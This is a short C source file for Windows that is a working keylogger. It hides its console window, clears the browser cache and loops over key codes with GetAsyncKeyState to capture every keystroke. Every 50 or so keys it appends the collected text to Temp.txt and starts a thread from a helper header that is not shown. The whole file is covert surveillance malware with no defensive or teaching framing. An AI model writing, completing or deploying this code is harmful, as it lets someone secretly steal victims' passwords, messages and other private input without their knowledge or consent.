#include <stdio.h>
#include <windows.h>
#include <direct.h>
#include <Winuser.h>
#include "functions.h"



int main(void)
{
    FreeConsole();
    clearBrowserCache();
    int counter=0;
    char* input=(char*)malloc(1100*sizeof(char));
    input[0]='\0';
    // SYSTEMTIME time;
    // GetSystemTime(&time); //gettimeofday()
    // SYSTEMTIME endtime; 
    // int flag=0;
    while(1)
    {
        for(char i=8;i<=190;i++)
        {
            // GetSystemTime(&endtime);
            // if(endtime.wSecond-time.wSecond>30 || time.wSecond-endtime.wSecond>30)
            // {
            //     printf("\n%d\n",endtime.wSecond-time.wSecond);
            //     time=endtime;    
            //     flag=1;            
            // }
            if(GetAsyncKeyState(i) == -32767)
            {
                counter++;
                Save(i,input);
                if(counter>50)
                {
                    //flag=0;
                    FILE *fp=fopen("Temp.txt","ab+");
                    fprintf(fp,"%s",input);
                    fclose(fp);
                    HANDLE thread = CreateThread(NULL,0,ThreadFunc,NULL,0,NULL);
                    //                  Linux Threads-include <pthread.h>
                    //pthread_t thread_id
                    //pthread_create(&thread_id,NULL,ThreadFunc,NULL);
                    counter=0;
                    free(input);
                    input=(char*) malloc(1100*sizeof(char));
                    input[0]='\0';

                }
            }
        }
    }
}